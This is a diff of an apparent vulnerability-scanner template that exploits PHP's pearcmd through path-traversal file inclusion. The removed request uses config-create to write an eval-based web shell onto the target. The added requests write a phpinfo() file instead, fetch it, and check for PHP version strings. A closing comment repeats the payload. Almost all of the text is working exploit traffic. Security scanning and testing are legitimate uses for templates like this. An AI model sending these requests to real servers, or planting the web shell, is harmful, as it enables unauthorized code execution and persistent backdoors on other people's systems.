@@ -11,7 +11,13 @@ info:
 http:
   - raw:
       - |
-        GET /public/index.php?lang=../../../../../../../../usr/local/lib/php/pearcmd&+config-create+/<?=@eval($_REQUEST['milu']);?>+/var/www/html/mikes.php HTTP/1.1
+        GET /?+config-create+/&lang=../../../../../../../../../../../usr/local/lib/php/pearcmd&/<?=phpinfo()?>+mikes.php HTTP/1.1
+        Host: {{Hostname}}  
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36
+        Accept-Encoding: gzip, deflate
+
+      - |
+        GET /mikes.php HTTP/1.1
         Host: {{Hostname}}  
         User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36
         Accept-Encoding: gzip, deflate
@@ -23,4 +29,8 @@ http:
           - 200
       - type: word
         words:
-          - 
+          - "PHP Extension"
+          - "PHP Version"
+
+
+# /?+config-create+/&lang=../../../../../../../../../../../usr/local/lib/php/pearcmd&/<?=phpinfo()?>+mikes.php
